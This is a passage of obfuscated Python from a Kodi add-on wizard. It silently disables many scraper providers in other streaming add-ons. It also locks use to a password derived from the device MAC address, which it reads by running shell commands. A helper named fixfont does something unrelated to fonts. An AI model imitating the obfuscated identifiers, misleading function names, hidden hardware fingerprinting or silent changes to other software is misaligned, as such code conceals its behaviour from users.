		OOO0000OO000OO0O0 .setSetting ('genv','false')#line:1210
		OOO0000OO000OO0O0 .setSetting ('getgo','false')#line:1211
		OOO0000OO000OO0O0 .setSetting ('gold','false')#line:1212
		OOO0000OO000OO0O0 .setSetting ('gona','false')#line:1213
		OOO0000OO000OO0O0 .setSetting ('hdmm','false')#line:1214
		OOO0000OO000OO0O0 .setSetting ('hdt','false')#line:1215
		OOO0000OO000OO0O0 .setSetting ('icy','false')#line:1216
		OOO0000OO000OO0O0 .setSetting ('ind','false')#line:1217
		OOO0000OO000OO0O0 .setSetting ('iwi','false')#line:1218
		OOO0000OO000OO0O0 .setSetting ('jen_free','false')#line:1219
		OOO0000OO000OO0O0 .setSetting ('kiss','false')#line:1220
		OOO0000OO000OO0O0 .setSetting ('lavin','false')#line:1221
		OOO0000OO000OO0O0 .setSetting ('los','false')#line:1222
		OOO0000OO000OO0O0 .setSetting ('m4u','false')#line:1223
		OOO0000OO000OO0O0 .setSetting ('mesh','false')#line:1224
		OOO0000OO000OO0O0 .setSetting ('mf','false')#line:1225
		OOO0000OO000OO0O0 .setSetting ('mkvc','false')#line:1226
		OOO0000OO000OO0O0 .setSetting ('mjy','false')#line:1227
		OOO0000OO000OO0O0 .setSetting ('hdonline','false')#line:1228
		OOO0000OO000OO0O0 .setSetting ('moviex','false')#line:1229
		OOO0000OO000OO0O0 .setSetting ('mpr','false')#line:1230
		OOO0000OO000OO0O0 .setSetting ('mvg','false')#line:1231
		OOO0000OO000OO0O0 .setSetting ('mvl','false')#line:1232
		OOO0000OO000OO0O0 .setSetting ('mvs','false')#line:1233
		OOO0000OO000OO0O0 .setSetting ('myeg','false')#line:1234
		OOO0000OO000OO0O0 .setSetting ('ninja','false')#line:1235
		OOO0000OO000OO0O0 .setSetting ('odb','false')#line:1236
		OOO0000OO000OO0O0 .setSetting ('ophd','false')#line:1237
		OOO0000OO000OO0O0 .setSetting ('pks','false')#line:1238
		OOO0000OO000OO0O0 .setSetting ('prf','false')#line:1239
		OOO0000OO000OO0O0 .setSetting ('put18','false')#line:1240
		OOO0000OO000OO0O0 .setSetting ('req','false')#line:1241
		OOO0000OO000OO0O0 .setSetting ('rftv','false')#line:1242
		OOO0000OO000OO0O0 .setSetting ('rltv','false')#line:1243
		OOO0000OO000OO0O0 .setSetting ('sc','false')#line:1244
		OOO0000OO000OO0O0 .setSetting ('seehd','false')#line:1245
		OOO0000OO000OO0O0 .setSetting ('showbox','false')#line:1246
		OOO0000OO000OO0O0 .setSetting ('shuid','false')#line:1247
		OOO0000OO000OO0O0 .setSetting ('sil_gh','false')#line:1248
		OOO0000OO000OO0O0 .setSetting ('spv','false')#line:1249
		OOO0000OO000OO0O0 .setSetting ('subs','false')#line:1250
		OOO0000OO000OO0O0 .setSetting ('tvs','false')#line:1251
		OOO0000OO000OO0O0 .setSetting ('tw','false')#line:1252
		OOO0000OO000OO0O0 .setSetting ('upto','false')#line:1253
		OOO0000OO000OO0O0 .setSetting ('vel','false')#line:1254
		OOO0000OO000OO0O0 .setSetting ('vex','false')#line:1255
		OOO0000OO000OO0O0 .setSetting ('vidc','false')#line:1256
		OOO0000OO000OO0O0 .setSetting ('w4hd','false')#line:1257
		OOO0000OO000OO0O0 .setSetting ('wav','false')#line:1258
		OOO0000OO000OO0O0 .setSetting ('wf','false')#line:1259
		OOO0000OO000OO0O0 .setSetting ('wse','false')#line:1260
		OOO0000OO000OO0O0 .setSetting ('wss','false')#line:1261
		OOO0000OO000OO0O0 .setSetting ('wsse','false')#line:1262
		OOO0000OO000OO0O0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1263
		OOO0000OO000OO0O0 .setSetting ('debrid.only','true')#line:1264
		OOO0000OO000OO0O0 .setSetting ('hosts.captcha','false')#line:1265
		OOO0000OO000OO0O0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1266
		OOO0000OO000OO0O0 .setSetting ('provider.123moviehd','false')#line:1267
		OOO0000OO000OO0O0 .setSetting ('provider.300mbdownload','false')#line:1268
		OOO0000OO000OO0O0 .setSetting ('provider.alltube','false')#line:1269
		OOO0000OO000OO0O0 .setSetting ('provider.allucde','false')#line:1270
		OOO0000OO000OO0O0 .setSetting ('provider.animebase','false')#line:1271
		OOO0000OO000OO0O0 .setSetting ('provider.animeloads','false')#line:1272
		OOO0000OO000OO0O0 .setSetting ('provider.animetoon','false')#line:1273
		OOO0000OO000OO0O0 .setSetting ('provider.bnwmovies','false')#line:1274
		OOO0000OO000OO0O0 .setSetting ('provider.boxfilm','false')#line:1275
		OOO0000OO000OO0O0 .setSetting ('provider.bs','false')#line:1276
		OOO0000OO000OO0O0 .setSetting ('provider.cartoonhd','false')#line:1277
		OOO0000OO000OO0O0 .setSetting ('provider.cdahd','false')#line:1278
		OOO0000OO000OO0O0 .setSetting ('provider.cdax','false')#line:1279
		OOO0000OO000OO0O0 .setSetting ('provider.cine','false')#line:1280
		OOO0000OO000OO0O0 .setSetting ('provider.cinenator','false')#line:1281
		OOO0000OO000OO0O0 .setSetting ('provider.cmovieshdbz','false')#line:1282
		OOO0000OO000OO0O0 .setSetting ('provider.coolmoviezone','false')#line:1283
		OOO0000OO000OO0O0 .setSetting ('provider.ddl','false')#line:1284
		OOO0000OO000OO0O0 .setSetting ('provider.deepmovie','false')#line:1285
		OOO0000OO000OO0O0 .setSetting ('provider.ekinomaniak','false')#line:1286
		OOO0000OO000OO0O0 .setSetting ('provider.ekinotv','false')#line:1287
		OOO0000OO000OO0O0 .setSetting ('provider.filiser','false')#line:1288
		OOO0000OO000OO0O0 .setSetting ('provider.filmpalast','false')#line:1289
		OOO0000OO000OO0O0 .setSetting ('provider.filmwebbooster','false')#line:1290
		OOO0000OO000OO0O0 .setSetting ('provider.filmxy','false')#line:1291
		OOO0000OO000OO0O0 .setSetting ('provider.fmovies','false')#line:1292
		OOO0000OO000OO0O0 .setSetting ('provider.foxx','false')#line:1293
		OOO0000OO000OO0O0 .setSetting ('provider.freefmovies','false')#line:1294
		OOO0000OO000OO0O0 .setSetting ('provider.freeputlocker','false')#line:1295
		OOO0000OO000OO0O0 .setSetting ('provider.furk','false')#line:1296
		OOO0000OO000OO0O0 .setSetting ('provider.gamatotv','false')#line:1297
		OOO0000OO000OO0O0 .setSetting ('provider.gogoanime','false')#line:1298
		OOO0000OO000OO0O0 .setSetting ('provider.gowatchseries','false')#line:1299
		OOO0000OO000OO0O0 .setSetting ('provider.hackimdb','false')#line:1300
		OOO0000OO000OO0O0 .setSetting ('provider.hdfilme','false')#line:1301
		OOO0000OO000OO0O0 .setSetting ('provider.hdmto','false')#line:1302
		OOO0000OO000OO0O0 .setSetting ('provider.hdpopcorns','false')#line:1303
		OOO0000OO000OO0O0 .setSetting ('provider.hdstreams','false')#line:1304
		OOO0000OO000OO0O0 .setSetting ('provider.horrorkino','false')#line:1306
		OOO0000OO000OO0O0 .setSetting ('provider.iitv','false')#line:1307
		OOO0000OO000OO0O0 .setSetting ('provider.iload','false')#line:1308
		OOO0000OO000OO0O0 .setSetting ('provider.iwaatch','false')#line:1309
		OOO0000OO000OO0O0 .setSetting ('provider.kinodogs','false')#line:1310
		OOO0000OO000OO0O0 .setSetting ('provider.kinoking','false')#line:1311
		OOO0000OO000OO0O0 .setSetting ('provider.kinow','false')#line:1312
		OOO0000OO000OO0O0 .setSetting ('provider.kinox','false')#line:1313
		OOO0000OO000OO0O0 .setSetting ('provider.lichtspielhaus','false')#line:1314
		OOO0000OO000OO0O0 .setSetting ('provider.liomenoi','false')#line:1315
		OOO0000OO000OO0O0 .setSetting ('provider.magnetdl','false')#line:1318
		OOO0000OO000OO0O0 .setSetting ('provider.megapelistv','false')#line:1319
		OOO0000OO000OO0O0 .setSetting ('provider.movie2k-ac','false')#line:1320
		OOO0000OO000OO0O0 .setSetting ('provider.movie2k-ag','false')#line:1321
		OOO0000OO000OO0O0 .setSetting ('provider.movie2z','false')#line:1322
		OOO0000OO000OO0O0 .setSetting ('provider.movie4k','false')#line:1323
		OOO0000OO000OO0O0 .setSetting ('provider.movie4kis','false')#line:1324
		OOO0000OO000OO0O0 .setSetting ('provider.movieneo','false')#line:1325
		OOO0000OO000OO0O0 .setSetting ('provider.moviesever','false')#line:1326
		OOO0000OO000OO0O0 .setSetting ('provider.movietown','false')#line:1327
		OOO0000OO000OO0O0 .setSetting ('provider.mvrls','false')#line:1329
		OOO0000OO000OO0O0 .setSetting ('provider.netzkino','false')#line:1330
		OOO0000OO000OO0O0 .setSetting ('provider.odb','false')#line:1331
		OOO0000OO000OO0O0 .setSetting ('provider.openkatalog','false')#line:1332
		OOO0000OO000OO0O0 .setSetting ('provider.ororo','false')#line:1333
		OOO0000OO000OO0O0 .setSetting ('provider.paczamy','false')#line:1334
		OOO0000OO000OO0O0 .setSetting ('provider.peliculasdk','false')#line:1335
		OOO0000OO000OO0O0 .setSetting ('provider.pelisplustv','false')#line:1336
		OOO0000OO000OO0O0 .setSetting ('provider.pepecine','false')#line:1337
		OOO0000OO000OO0O0 .setSetting ('provider.primewire','false')#line:1338
		OOO0000OO000OO0O0 .setSetting ('provider.projectfreetv','false')#line:1339
		OOO0000OO000OO0O0 .setSetting ('provider.proxer','false')#line:1340
		OOO0000OO000OO0O0 .setSetting ('provider.pureanime','false')#line:1341
		OOO0000OO000OO0O0 .setSetting ('provider.putlocker','false')#line:1342
		OOO0000OO000OO0O0 .setSetting ('provider.putlockerfree','false')#line:1343
		OOO0000OO000OO0O0 .setSetting ('provider.reddit','false')#line:1344
		OOO0000OO000OO0O0 .setSetting ('provider.cartoonwire','false')#line:1345
		OOO0000OO000OO0O0 .setSetting ('provider.seehd','false')#line:1346
		OOO0000OO000OO0O0 .setSetting ('provider.segos','false')#line:1347
		OOO0000OO000OO0O0 .setSetting ('provider.serienstream','false')#line:1348
		OOO0000OO000OO0O0 .setSetting ('provider.series9','false')#line:1349
		OOO0000OO000OO0O0 .setSetting ('provider.seriesever','false')#line:1350
		OOO0000OO000OO0O0 .setSetting ('provider.seriesonline','false')#line:1351
		OOO0000OO000OO0O0 .setSetting ('provider.seriespapaya','false')#line:1352
		OOO0000OO000OO0O0 .setSetting ('provider.sezonlukdizi','false')#line:1353
		OOO0000OO000OO0O0 .setSetting ('provider.solarmovie','false')#line:1354
		OOO0000OO000OO0O0 .setSetting ('provider.solarmoviez','false')#line:1355
		OOO0000OO000OO0O0 .setSetting ('provider.stream-to','false')#line:1356
		OOO0000OO000OO0O0 .setSetting ('provider.streamdream','false')#line:1357
		OOO0000OO000OO0O0 .setSetting ('provider.streamflix','false')#line:1358
		OOO0000OO000OO0O0 .setSetting ('provider.streamit','false')#line:1359
		OOO0000OO000OO0O0 .setSetting ('provider.swatchseries','false')#line:1360
		OOO0000OO000OO0O0 .setSetting ('provider.szukajkatv','false')#line:1361
		OOO0000OO000OO0O0 .setSetting ('provider.tainiesonline','false')#line:1362
		OOO0000OO000OO0O0 .setSetting ('provider.tainiomania','false')#line:1363
		OOO0000OO000OO0O0 .setSetting ('provider.tata','false')#line:1366
		OOO0000OO000OO0O0 .setSetting ('provider.trt','false')#line:1367
		OOO0000OO000OO0O0 .setSetting ('provider.tvbox','false')#line:1368
		OOO0000OO000OO0O0 .setSetting ('provider.ultrahd','false')#line:1369
		OOO0000OO000OO0O0 .setSetting ('provider.video4k','false')#line:1370
		OOO0000OO000OO0O0 .setSetting ('provider.vidics','false')#line:1371
		OOO0000OO000OO0O0 .setSetting ('provider.view4u','false')#line:1372
		OOO0000OO000OO0O0 .setSetting ('provider.watchseries','false')#line:1373
		OOO0000OO000OO0O0 .setSetting ('provider.xrysoi','false')#line:1374
		OOO0000OO000OO0O0 .setSetting ('provider.library','false')#line:1375
def fixfont ():#line:1378
	OO00O0O00000O0OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1379
	OOO000OO0O00O0OO0 =json .loads (OO00O0O00000O0OOO );#line:1381
	OO0O0O00O00OOOO00 =OOO000OO0O00O0OO0 ["result"]["settings"]#line:1382
	OOO00OO0O000OO000 =[OOO0O00OO00O00O0O for OOO0O00OO00O00O0O in OO0O0O00O00OOOO00 if OOO0O00OO00O00O0O ["id"]=="audiooutput.audiodevice"][0 ]#line:1384
	OOOO0O0000OOO0O00 =OOO00OO0O000OO000 ["options"];#line:1385
	O0000O00OO0O00OOO =OOO00OO0O000OO000 ["value"];#line:1386
	OOO0O0O00000O0OO0 =[O000O000O00OOOOOO for (O000O000O00OOOOOO ,OOOO00OOOOO00O0OO )in enumerate (OOOO0O0000OOO0O00 )if OOOO00OOOOO00O0OO ["value"]==O0000O00OO0O00OOO ][0 ];#line:1388
	O0O0O0O0OOO0O0000 =(OOO0O0O00000O0OO0 +1 )%len (OOOO0O0000OOO0O00 )#line:1390
	O0OO00OOO0000O000 =OOOO0O0000OOO0O00 [O0O0O0O0OOO0O0000 ]["value"]#line:1392
	OO0O00O0O00OOOO0O =OOOO0O0000OOO0O00 [O0O0O0O0OOO0O0000 ]["label"]#line:1393
	OOOO00OOOOOO000O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1395
	try :#line:1397
		OO0000O0OOOOOOOO0 =json .loads (OOOO00OOOOOO000O0 );#line:1398
		if OO0000O0OOOOOOOO0 ["result"]!=True :#line:1400
			raise Exception #line:1401
	except :#line:1402
		sys .stderr .write ("Error switching audio output device")#line:1403
		raise Exception #line:1404
def parseDOM2 (OOO00OO00000O0O00 ,name =u"",attrs ={},ret =False ):#line:1405
	if isinstance (OOO00OO00000O0O00 ,str ):#line:1408
		try :#line:1409
			OOO00OO00000O0O00 =[OOO00OO00000O0O00 .decode ("utf-8")]#line:1410
		except :#line:1411
			OOO00OO00000O0O00 =[OOO00OO00000O0O00 ]#line:1412
	elif isinstance (OOO00OO00000O0O00 ,unicode ):#line:1413
		OOO00OO00000O0O00 =[OOO00OO00000O0O00 ]#line:1414
	elif not isinstance (OOO00OO00000O0O00 ,list ):#line:1415
		return u""#line:1416
	if not name .strip ():#line:1418
		return u""#line:1419
	OO0OO0OO0OOOOO0OO =[]#line:1421
	for O0O0O000O0O0O00O0 in OOO00OO00000O0O00 :#line:1422
		OOOO0O00O0OO0OO00 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0O0O000O0O0O00O0 )#line:1423
		for O00OO0O000O00OOO0 in OOOO0O00O0OO0OO00 :#line:1424
			O0O0O000O0O0O00O0 =O0O0O000O0O0O00O0 .replace (O00OO0O000O00OOO0 ,O00OO0O000O00OOO0 .replace ("\n"," "))#line:1425
		OOO0OO0OO0O0O00O0 =[]#line:1427
		for O00O0O00O00O0OOO0 in attrs :#line:1428
			O00O0O0O0O000OO00 =re .compile ('(<'+name +'[^>]*?(?:'+O00O0O00O00O0OOO0 +'=[\'"]'+attrs [O00O0O00O00O0OOO0 ]+'[\'"].*?>))',re .M |re .S ).findall (O0O0O000O0O0O00O0 )#line:1429
			if len (O00O0O0O0O000OO00 )==0 and attrs [O00O0O00O00O0OOO0 ].find (" ")==-1 :#line:1430
				O00O0O0O0O000OO00 =re .compile ('(<'+name +'[^>]*?(?:'+O00O0O00O00O0OOO0 +'='+attrs [O00O0O00O00O0OOO0 ]+'.*?>))',re .M |re .S ).findall (O0O0O000O0O0O00O0 )#line:1431
			if len (OOO0OO0OO0O0O00O0 )==0 :#line:1433
				OOO0OO0OO0O0O00O0 =O00O0O0O0O000OO00 #line:1434
				O00O0O0O0O000OO00 =[]#line:1435
			else :#line:1436
				OO0O000O0OO000O0O =range (len (OOO0OO0OO0O0O00O0 ))#line:1437
				OO0O000O0OO000O0O .reverse ()#line:1438
				for O000O000000O0OOO0 in OO0O000O0OO000O0O :#line:1439
					if not OOO0OO0OO0O0O00O0 [O000O000000O0OOO0 ]in O00O0O0O0O000OO00 :#line:1440
						del (OOO0OO0OO0O0O00O0 [O000O000000O0OOO0 ])#line:1441
		if len (OOO0OO0OO0O0O00O0 )==0 and attrs =={}:#line:1443
			OOO0OO0OO0O0O00O0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0O0O000O0O0O00O0 )#line:1444
			if len (OOO0OO0OO0O0O00O0 )==0 :#line:1445
				OOO0OO0OO0O0O00O0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0O0O000O0O0O00O0 )#line:1446
		if isinstance (ret ,str ):#line:1448
			O00O0O0O0O000OO00 =[]#line:1449
			for O00OO0O000O00OOO0 in OOO0OO0OO0O0O00O0 :#line:1450
				OO000O00OO00OOOO0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O00OO0O000O00OOO0 )#line:1451
				if len (OO000O00OO00OOOO0 )==0 :#line:1452
					OO000O00OO00OOOO0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O00OO0O000O00OOO0 )#line:1453
				for OO0O0O0O00O0O00O0 in OO000O00OO00OOOO0 :#line:1454
					OOO0OOOOOO00O0000 =OO0O0O0O00O0O00O0 [0 ]#line:1455
					if OOO0OOOOOO00O0000 in "'\"":#line:1456
						if OO0O0O0O00O0O00O0 .find ('='+OOO0OOOOOO00O0000 ,OO0O0O0O00O0O00O0 .find (OOO0OOOOOO00O0000 ,1 ))>-1 :#line:1457
							OO0O0O0O00O0O00O0 =OO0O0O0O00O0O00O0 [:OO0O0O0O00O0O00O0 .find ('='+OOO0OOOOOO00O0000 ,OO0O0O0O00O0O00O0 .find (OOO0OOOOOO00O0000 ,1 ))]#line:1458
						if OO0O0O0O00O0O00O0 .rfind (OOO0OOOOOO00O0000 ,1 )>-1 :#line:1460
							OO0O0O0O00O0O00O0 =OO0O0O0O00O0O00O0 [1 :OO0O0O0O00O0O00O0 .rfind (OOO0OOOOOO00O0000 )]#line:1461
					else :#line:1462
						if OO0O0O0O00O0O00O0 .find (" ")>0 :#line:1463
							OO0O0O0O00O0O00O0 =OO0O0O0O00O0O00O0 [:OO0O0O0O00O0O00O0 .find (" ")]#line:1464
						elif OO0O0O0O00O0O00O0 .find ("/")>0 :#line:1465
							OO0O0O0O00O0O00O0 =OO0O0O0O00O0O00O0 [:OO0O0O0O00O0O00O0 .find ("/")]#line:1466
						elif OO0O0O0O00O0O00O0 .find (">")>0 :#line:1467
							OO0O0O0O00O0O00O0 =OO0O0O0O00O0O00O0 [:OO0O0O0O00O0O00O0 .find (">")]#line:1468
					O00O0O0O0O000OO00 .append (OO0O0O0O00O0O00O0 .strip ())#line:1470
			OOO0OO0OO0O0O00O0 =O00O0O0O0O000OO00 #line:1471
		else :#line:1472
			O00O0O0O0O000OO00 =[]#line:1473
			for O00OO0O000O00OOO0 in OOO0OO0OO0O0O00O0 :#line:1474
				OOOOO0OO00O0000O0 =u"</"+name #line:1475
				O00OO00OO0O00OOO0 =O0O0O000O0O0O00O0 .find (O00OO0O000O00OOO0 )#line:1477
				O00O0O00OOO0O0O00 =O0O0O000O0O0O00O0 .find (OOOOO0OO00O0000O0 ,O00OO00OO0O00OOO0 )#line:1478
				O0O0000OOOO00O000 =O0O0O000O0O0O00O0 .find ("<"+name ,O00OO00OO0O00OOO0 +1 )#line:1479
				while O0O0000OOOO00O000 <O00O0O00OOO0O0O00 and O0O0000OOOO00O000 !=-1 :#line:1481
					O0OO0OO0O00000000 =O0O0O000O0O0O00O0 .find (OOOOO0OO00O0000O0 ,O00O0O00OOO0O0O00 +len (OOOOO0OO00O0000O0 ))#line:1482
					if O0OO0OO0O00000000 !=-1 :#line:1483
						O00O0O00OOO0O0O00 =O0OO0OO0O00000000 #line:1484
					O0O0000OOOO00O000 =O0O0O000O0O0O00O0 .find ("<"+name ,O0O0000OOOO00O000 +1 )#line:1485
				if O00OO00OO0O00OOO0 ==-1 and O00O0O00OOO0O0O00 ==-1 :#line:1487
					O0O00OO0O000O0000 =u""#line:1488
				elif O00OO00OO0O00OOO0 >-1 and O00O0O00OOO0O0O00 >-1 :#line:1489
					O0O00OO0O000O0000 =O0O0O000O0O0O00O0 [O00OO00OO0O00OOO0 +len (O00OO0O000O00OOO0 ):O00O0O00OOO0O0O00 ]#line:1490
				elif O00O0O00OOO0O0O00 >-1 :#line:1491
					O0O00OO0O000O0000 =O0O0O000O0O0O00O0 [:O00O0O00OOO0O0O00 ]#line:1492
				elif O00OO00OO0O00OOO0 >-1 :#line:1493
					O0O00OO0O000O0000 =O0O0O000O0O0O00O0 [O00OO00OO0O00OOO0 +len (O00OO0O000O00OOO0 ):]#line:1494
				if ret :#line:1496
					OOOOO0OO00O0000O0 =O0O0O000O0O0O00O0 [O00O0O00OOO0O0O00 :O0O0O000O0O0O00O0 .find (">",O0O0O000O0O0O00O0 .find (OOOOO0OO00O0000O0 ))+1 ]#line:1497
					O0O00OO0O000O0000 =O00OO0O000O00OOO0 +O0O00OO0O000O0000 +OOOOO0OO00O0000O0 #line:1498
				O0O0O000O0O0O00O0 =O0O0O000O0O0O00O0 [O0O0O000O0O0O00O0 .find (O0O00OO0O000O0000 ,O0O0O000O0O0O00O0 .find (O00OO0O000O00OOO0 ))+len (O0O00OO0O000O0000 ):]#line:1500
				O00O0O0O0O000OO00 .append (O0O00OO0O000O0000 )#line:1501
			OOO0OO0OO0O0O00O0 =O00O0O0O0O000OO00 #line:1502
		OO0OO0OO0OOOOO0OO +=OOO0OO0OO0O0O00O0 #line:1503
	return OO0OO0OO0OOOOO0OO #line:1505
def addItem (OO00O0000OO0O0OO0 ,O00OOOOOO00O0O000 ,OOO00O0OO0OO00OO0 ,O0000OOOOOOO0000O ,O00O0O00O00O0OO0O ,description =None ):#line:1507
	if description ==None :description =''#line:1508
	description ='[COLOR white]'+description +'[/COLOR]'#line:1509
	OO0OO0OO0O00O0000 =sys .argv [0 ]+"?url="+urllib .quote_plus (O00OOOOOO00O0O000 )+"&mode="+str (OOO00O0OO0OO00OO0 )+"&name="+urllib .quote_plus (OO00O0000OO0O0OO0 )+"&iconimage="+urllib .quote_plus (O0000OOOOOOO0000O )+"&fanart="+urllib .quote_plus (O00O0O00O00O0OO0O )#line:1510
	OOOO000O0OOO00OO0 =True #line:1511
	O0O0OOOOO00OOO000 =xbmcgui .ListItem (OO00O0000OO0O0OO0 ,iconImage =O0000OOOOOOO0000O ,thumbnailImage =O0000OOOOOOO0000O )#line:1512
	O0O0OOOOO00OOO000 .setInfo (type ="Video",infoLabels ={"Title":OO00O0000OO0O0OO0 ,"Plot":description })#line:1513
	O0O0OOOOO00OOO000 .setProperty ("fanart_Image",O00O0O00O00O0OO0O )#line:1514
	O0O0OOOOO00OOO000 .setProperty ("icon_Image",O0000OOOOOOO0000O )#line:1515
	OOOO000O0OOO00OO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OO0OO0O00O0000 ,listitem =O0O0OOOOO00OOO000 ,isFolder =False )#line:1516
	return OOOO000O0OOO00OO0 #line:1517
def get_params ():#line:1519
		O0OO0OO0OO000O00O =[]#line:1520
		O0O00000O0O0O000O =sys .argv [2 ]#line:1521
		if len (O0O00000O0O0O000O )>=2 :#line:1522
				OO00O0O00000O00OO =sys .argv [2 ]#line:1523
				O0000O0OOOOO0000O =OO00O0O00000O00OO .replace ('?','')#line:1524
				if (OO00O0O00000O00OO [len (OO00O0O00000O00OO )-1 ]=='/'):#line:1525
						OO00O0O00000O00OO =OO00O0O00000O00OO [0 :len (OO00O0O00000O00OO )-2 ]#line:1526
				OOOO0OOOO0OOOO0O0 =O0000O0OOOOO0000O .split ('&')#line:1527
				O0OO0OO0OO000O00O ={}#line:1528
				for O00OO0OOOOOO000OO in range (len (OOOO0OOOO0OOOO0O0 )):#line:1529
						O0O0O0O0OOO0000O0 ={}#line:1530
						O0O0O0O0OOO0000O0 =OOOO0OOOO0OOOO0O0 [O00OO0OOOOOO000OO ].split ('=')#line:1531
						if (len (O0O0O0O0OOO0000O0 ))==2 :#line:1532
								O0OO0OO0OO000O00O [O0O0O0O0OOO0000O0 [0 ]]=O0O0O0O0OOO0000O0 [1 ]#line:1533
		return O0OO0OO0OO000O00O #line:1535
def decode (O000OO00O0O0O000O ,OOOOO00OOO0O0O00O ):#line:1540
    import base64 #line:1541
    OOO00O0O0OO0O00O0 =[]#line:1542
    if (len (O000OO00O0O0O000O ))!=4 :#line:1544
     return 10 #line:1545
    OOOOO00OOO0O0O00O =base64 .urlsafe_b64decode (OOOOO00OOO0O0O00O )#line:1546
    for O00O0OO00O0OO0000 in range (len (OOOOO00OOO0O0O00O )):#line:1548
        O0O0O00OO00OOOO00 =O000OO00O0O0O000O [O00O0OO00O0OO0000 %len (O000OO00O0O0O000O )]#line:1549
        O0O0000OO00OOOOOO =chr ((256 +ord (OOOOO00OOO0O0O00O [O00O0OO00O0OO0000 ])-ord (O0O0O00OO00OOOO00 ))%256 )#line:1550
        OOO00O0O0OO0O00O0 .append (O0O0000OO00OOOOOO )#line:1551
    return "".join (OOO00O0O0OO0O00O0 )#line:1552
def tmdb_list (OOO00O00O00OOOOO0 ):#line:1553
    OO00O000OO00O0000 =decode ("7643",OOO00O00O00OOOOO0 )#line:1556
    return int (OO00O000OO00O0000 )#line:1559
def u_list (O00OO000O00OOO000 ):#line:1560
    from math import sqrt #line:1562
    OO00OOOOOO00O0000 =tmdb_list (TMDB_NEW_API )#line:1563
    O0000O0O0OOOOOO00 =str ((getHwAddr ('eth0'))*OO00OOOOOO00O0000 )#line:1565
    OOOOO00OO0OOO0O00 =int (O0000O0O0OOOOOO00 [1 ]+O0000O0O0OOOOOO00 [2 ]+O0000O0O0OOOOOO00 [5 ]+O0000O0O0OOOOOO00 [7 ])#line:1566
    OOO000O0O0000O000 =(ADDON .getSetting ("pass"))#line:1568
    OO0O0OO00O0OOOO00 =(str (round (sqrt ((OOOOO00OO0OOO0O00 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1573
    if '.'in OO0O0OO00O0OOOO00 :#line:1574
     OO0O0OO00O0OOOO00 =(str (round (sqrt ((OOOOO00OO0OOO0O00 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1575
    if OOO000O0O0000O000 ==OO0O0OO00O0OOOO00 :#line:1577
      O0O00OO0O00O0O00O =O00OO000O00OOO000 #line:1579
    else :#line:1581
       if STARTP2 ()and STARTP ()=='ok':#line:1582
         return O00OO000O00OOO000 #line:1585
       O0O00OO0O00O0O00O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1586
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1587
       sys .exit ()#line:1588
    return O0O00OO0O00O0O00O #line:1589
def disply_hwr ():#line:1591
   try :#line:1592
    O0O0OOOOOO0000O00 =tmdb_list (TMDB_NEW_API )#line:1593
    O00O0OO00O0O0O00O =str ((getHwAddr ('eth0'))*O0O0OOOOOO0000O00 )#line:1594
    O0000O0OOO00O0000 =(O00O0OO00O0O0O00O [1 ]+O00O0OO00O0O0O00O [2 ]+O00O0OO00O0O0O00O [5 ]+O00O0OO00O0O0O00O [7 ])#line:1601
    O0OOO00O00O0OO000 =(ADDON .getSetting ("action"))#line:1602
    wiz .setS ('action',str (O0000O0OOO00O0000 ))#line:1604
   except :pass #line:1605
def disply_hwr2 ():#line:1606
   try :#line:1607
    OO0O0OOO0OOOOO0O0 =tmdb_list (TMDB_NEW_API )#line:1608
    OOO00O00O00OOO0O0 =str ((getHwAddr ('eth0'))*OO0O0OOO0OOOOO0O0 )#line:1610
    OO00OOO0OO00OO0OO =(OOO00O00O00OOO0O0 [1 ]+OOO00O00O00OOO0O0 [2 ]+OOO00O00O00OOO0O0 [5 ]+OOO00O00O00OOO0O0 [7 ])#line:1619
    O0O0OOOO000OOO00O =(ADDON .getSetting ("action"))#line:1620
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO00OOO0OO00OO0OO )#line:1623
   except :pass #line:1624
def getHwAddr (O00OOO000OO000O0O ):#line:1626
   import subprocess ,time #line:1627
   O0000OOO000O0OOOO ='windows'#line:1628
   if xbmc .getCondVisibility ('system.platform.android'):#line:1629
       O0000OOO000O0OOOO ='android'#line:1630
   if xbmc .getCondVisibility ('system.platform.android'):#line:1631
     OO0O0OOOOO00O0O00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1632
     OO0O0OOO00OOO00O0 =re .compile ('link/ether (.+?) brd').findall (str (OO0O0OOOOO00O0O00 ))#line:1634
     O000OOO0OOO00OOOO =0 #line:1635
     for O0000OOOO00OO0O0O in OO0O0OOO00OOO00O0 :#line:1636
      if OO0O0OOO00OOO00O0 !='00:00:00:00:00:00':#line:1637
          OOOO000OO00OO000O =O0000OOOO00OO0O0O #line:1638
          O000OOO0OOO00OOOO =O000OOO0OOO00OOOO +int (OOOO000OO00OO000O .replace (':',''),16 )#line:1639
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1641
       O000OOO00O00O00O0 =0 #line:1642
       O000OOO0OOO00OOOO =0 #line:1643
       O00OOOO00OOO0OOOO =[]#line:1644
       OO00O00OO0O00O0O0 =os .popen ("getmac").read ()#line:1645
       OO00O00OO0O00O0O0 =OO00O00OO0O00O0O0 .split ("\n")#line:1646
       for O0OOO0O0000000O0O in OO00O00OO0O00O0O0 :#line:1648
            O0O00O00O00OO00OO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0OOO0O0000000O0O ,re .I )#line:1649
            if O0O00O00O00OO00OO :#line:1650
